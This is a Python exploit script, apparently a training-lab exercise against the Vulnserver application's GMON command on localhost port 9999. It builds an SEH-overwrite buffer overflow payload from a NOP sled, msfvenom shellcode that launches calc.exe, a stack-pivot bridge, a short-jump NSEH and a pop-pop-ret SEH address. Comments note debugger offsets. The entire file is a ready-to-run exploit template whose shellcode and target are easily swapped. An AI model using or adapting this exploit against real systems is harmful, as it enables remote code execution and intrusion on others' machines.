import socket
from struct import pack

def sendBuffer(ip, port, buf):
    try:
        print("[*] Sending buffer")
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip, port))
        s.send(buf)
        s.recv(1024)
        s.close()
        print("[*] Buffer sent!")
        print(len(buf))
    except Exception as e:
        print(str(e))
def main():
    ip = "127.0.0.1"
    port = 9999
    size = 3550 

    """
    0:004> !exchain
    010bedac: ntdll!ExecuteHandler2+44 (77d68b50)
    010bffcc: 356f4534
    Invalid exception stack at 6f45336f

    3554 - 356f4534
    3550 - 6f45336f

    After adjusted values:
    0:003> !exchain
    00ecedac: ntdll!ExecuteHandler2+44 (77d68b50)
    00ecffcc: 43434343
    Invalid exception stack at 42424242

    """
    # msfvenom -p windows/exec cmd=calc.exe -b "\x00" -f py -v shellcode EXITFUNC=thread
    shellcode =  b""
    shellcode += b"\xda\xc1\xd9\x74\x24\xf4\xbf\x71\xe0\x66\x10"
    shellcode += b"\x5e\x2b\xc9\xb1\x31\x83\xc6\x04\x31\x7e\x14"
    shellcode += b"\x03\x7e\x65\x02\x93\xec\x6d\x40\x5c\x0d\x6d"
    shellcode += b"\x25\xd4\xe8\x5c\x65\x82\x79\xce\x55\xc0\x2c"
    shellcode += b"\xe2\x1e\x84\xc4\x71\x52\x01\xea\x32\xd9\x77"
    shellcode += b"\xc5\xc3\x72\x4b\x44\x47\x89\x98\xa6\x76\x42"
    shellcode += b"\xed\xa7\xbf\xbf\x1c\xf5\x68\xcb\xb3\xea\x1d"
    shellcode += b"\x81\x0f\x80\x6d\x07\x08\x75\x25\x26\x39\x28"
    shellcode += b"\x3e\x71\x99\xca\x93\x09\x90\xd4\xf0\x34\x6a"
    shellcode += b"\x6e\xc2\xc3\x6d\xa6\x1b\x2b\xc1\x87\x94\xde"
    shellcode += b"\x1b\xcf\x12\x01\x6e\x39\x61\xbc\x69\xfe\x18"
    shellcode += b"\x1a\xff\xe5\xba\xe9\xa7\xc1\x3b\x3d\x31\x81"
    shellcode += b"\x37\x8a\x35\xcd\x5b\x0d\x99\x65\x67\x86\x1c"
    shellcode += b"\xaa\xee\xdc\x3a\x6e\xab\x87\x23\x37\x11\x69"
    shellcode += b"\x5b\x27\xfa\xd6\xf9\x23\x16\x02\x70\x6e\x7c"
    shellcode += b"\xd5\x06\x14\x32\xd5\x18\x17\x62\xbe\x29\x9c"
    shellcode += b"\xed\xb9\xb5\x77\x4a\x25\x54\x52\xa6\xce\xc1"
    shellcode += b"\x37\x0b\x93\xf1\xed\x4f\xaa\x71\x04\x2f\x49"
    shellcode += b"\x69\x6d\x2a\x15\x2d\x9d\x46\x06\xd8\xa1\xf5"
    shellcode += b"\x27\xc9\xc1\x98\xbb\x91\x2b\x3f\x3c\x33\x34"
    bridge = b""
    # 0x7f = 127
    # Adjusting esp with 1016 bytes
    bridge += b"\x83\xC4\x7F" * 8 # add esp,0x7f - 24 bytes
    bridge+= b"\x83\xC4\x7D" # add esp, 0x7d - 3 bytes
    bridge += b"\xFF\xE4" # jmp esp - 2 bytes
    nopsled = b"\x90" * 200
    inputBuf = b"GMON "
    inputBuf += b"/"
    inputBuf += nopsled
    inputBuf+= shellcode
    inputBuf+= b"/" * (size - len(nopsled) - len(shellcode) - len(bridge))
    inputBuf += bridge
    # ebdf
    inputBuf += pack("<L", (0xdfeb9090)) # NSEH
    inputBuf += pack("<L", (0x625011b3)) # SEH - pop eax; pop eax; ret
    inputBuf += b"\x44" * 544 # Filler
    sendBuffer(ip, int(port), inputBuf)
if __name__ == '__main__':
    main()